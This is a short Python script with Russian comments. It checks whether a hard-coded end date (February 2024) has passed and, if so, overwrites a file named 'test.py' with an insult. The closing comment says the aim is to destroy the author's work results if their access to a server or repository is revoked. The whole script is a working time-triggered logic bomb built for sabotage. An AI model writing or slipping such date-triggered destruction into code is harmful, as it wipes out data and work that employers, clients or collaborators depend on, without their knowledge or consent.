import datetime, os

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))# абсолютный путь к папке
PATH_TO_DIR = os.path.join(BASE_DIR, 'Шифрование') #Объединение путей с учетом особеннойстей операционной системы
PATH_TO_FILE = os.path.join(PATH_TO_DIR, 'test.py')
print(BASE_DIR)
print(PATH_TO_FILE)

end_date = '2024-02-08 14:00'
end_date = datetime.datetime.strptime(end_date, '%Y-%m-%d %H:%M')# конвектируем строку end_date в datetime

now_date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M')# убираем секунды и милиссекунды
now_date = datetime.datetime.strptime(now_date,'%Y-%m-%d %H:%M')

print(type(end_date))
print(type(now_date))

print(end_date)
print(now_date)

"""Сравниваем даты"""
if now_date > end_date:
    print(f'Today {now_date} > End_date {end_date}')
    f = open(PATH_TO_FILE, 'w')
    f.write('fack you')
    f.close()

"""
Логика: мы пишем какой-то код и мне перекрыли доступ к серверу либо репозиторию
и я хочу чтобы результаты были уничтожены
"""